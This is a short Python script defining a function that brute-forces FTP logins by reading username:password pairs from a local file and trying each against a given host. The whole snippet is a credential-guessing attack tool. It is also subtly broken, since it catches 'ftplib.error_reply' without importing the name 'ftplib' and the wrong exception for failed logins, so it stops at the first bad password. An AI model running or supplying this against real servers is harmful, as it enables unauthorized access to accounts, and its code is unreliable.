from ftplib import *
def bruteforce(host):
    try:
        ftp = FTP(host)
        with open('myfile.txt') as f:
            credentials = [x.strip().split(':') for x in f.readlines()]
        for username, password in credentials:
            print (username, password)
            ftp.login(username, password)
    except ftplib.error_reply:
        print ("error")
